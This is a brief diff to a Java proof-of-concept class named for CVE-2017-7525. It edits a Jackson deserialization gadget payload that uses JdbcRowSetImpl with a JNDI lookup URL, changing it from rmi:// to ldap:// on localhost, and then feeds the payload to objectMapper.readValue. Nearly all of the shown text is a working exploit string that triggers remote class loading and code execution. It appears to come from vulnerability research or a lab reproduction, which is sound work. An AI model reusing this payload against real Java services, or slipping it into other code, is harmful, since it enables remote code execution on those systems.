@@ -29,7 +29,7 @@ public class CVE_2017_7525
 //        Method disableDefaultTypingM = objectMapper.getClass().getMethod("disableDefaultTyping");
 //        disableDefaultTypingM.invoke(objectMapper);
 
-        String json = "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/w2repa\",\"autoCommit\":true}";
+        String json = "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/gz0mo6\",\"autoCommit\":true}";
         System.out.println(json);
         objectMapper.readValue(json, Object.class);
     }
